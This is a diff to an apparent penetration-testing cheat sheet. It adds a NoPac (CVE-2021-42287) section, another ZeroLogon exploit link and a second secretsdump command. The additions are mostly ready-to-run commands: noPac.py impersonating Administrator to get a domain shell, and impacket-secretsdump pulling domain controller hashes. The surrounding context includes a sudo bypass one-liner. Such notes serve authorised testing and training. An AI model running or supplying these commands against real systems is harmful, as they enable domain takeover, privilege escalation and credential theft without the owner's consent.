@@ -165,6 +165,7 @@ Thank you for reading.
 		- [CVE-2019-14287: Sudo Bypass](#cve-2019-14287-sudo-bypass)
 		- [CVE-2020-1472: ZeroLogon PE](#cve-2020-1472-zerologon-pe)
 		- [CVE-2021–3156: Sudo / sudoedit LPE](#cve-2021-3156-sudo--sudoedit-lpe)
+		- [CVE-2021-42287: NoPac LPE](#cve-2021-42287-nopac-lpe)
 		- [CVE-2021-44228: Log4Shell RCE (0-day)](#cve-2021-44228-log4shell-rce-0-day)
 		- [CVE-2022-0847: Dirty Pipe LPE](#cve-2022-0847-dirty-pipe-lpe)
 		- [CVE-2022-22963: Spring4Shell RCE (0-day)](#cve-2022-22963-spring4shell-rce-0-day)
@@ -7644,6 +7645,8 @@ sudo -u#-1 /bin/bash
 
 > https://github.com/SecuraBV/CVE-2020-1472
 
+> https://github.com/dirkjanm/CVE-2020-1472
+
 > https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py
 
 ##### Prerequisites
@@ -7780,6 +7783,12 @@ python3 zerologon_tester.py <HANDLE> <RHOST>
 impacket-secretsdump -just-dc -no-pass <HANDLE>\$@<RHOST>
 ```
 
+or
+
+```shell
+impacket-secretsdump '<DOMAIN>'/'<RHOST>$'@<RHOST> -no-pass
+```
+
 #### CVE-2021-3156: Sudo / sudoedit LPE
 
 > https://medium.com/mii-cybersec/privilege-escalation-cve-2021-3156-new-sudo-vulnerability-4f9e84a9f435
@@ -7805,6 +7814,14 @@ segfault
 ```
 
 Not vulnerable if the error message starts with `usage:`.
+
+#### CVE-2021-42287: NoPac LPE
+
+> https://github.com/Ridter/noPac
+
+```shell
+python3 noPac.py '<DOMAIN>'/'<USERNAME>':'<PASSWORD>' -dc-ip <RHOST> -shell --impersonate 'Administrator' -use-ldap
+```
 
 #### CVE-2021-44228: Log4Shell RCE (0-day)
 
